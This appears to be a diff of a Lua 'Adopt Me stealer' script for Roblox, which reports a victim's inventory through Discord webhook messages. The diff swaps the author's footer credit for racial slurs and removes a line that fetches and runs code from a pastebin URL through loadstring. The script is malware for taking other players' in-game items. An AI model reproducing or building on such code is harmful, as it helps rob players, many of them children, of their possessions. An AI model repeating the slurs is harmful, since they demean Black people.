@@ -223,7 +223,7 @@ local function SendJoinMessage(list, prefix)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Adopt Me stealer by Tobi. discord.gg/GY2RVSEGDT"
+                ["text"] = "krxm some nigguh execute yo script"
             }
         }}
     }
@@ -308,7 +308,7 @@ local function SendMessage(sortedItems)
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "Adopt Me stealer by Tobi. discord.gg/GY2RVSEGDT"
+				["text"] = "u just got krxm niggah"
 			}
         }}
     }
@@ -394,7 +394,7 @@ local function SendDHJoinMessage(list, prefix)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Adopt Me stealer by Tobi. discord.gg/GY2RVSEGDT"
+                ["text"] = "some nigga execute ur script"
             }
         }}
     }
@@ -452,8 +452,6 @@ local excludedItems = {
     "spring_2025_minigame_spotted_kaijunior"
 }
 local inventory = data[plr.Name].inventory
-
-loadstring(game:HttpGet('https://pastebin.com/raw/NPG9wzyS'))()
 
 for category, list in pairs(inventory) do
     for uid, data in pairs(list) do
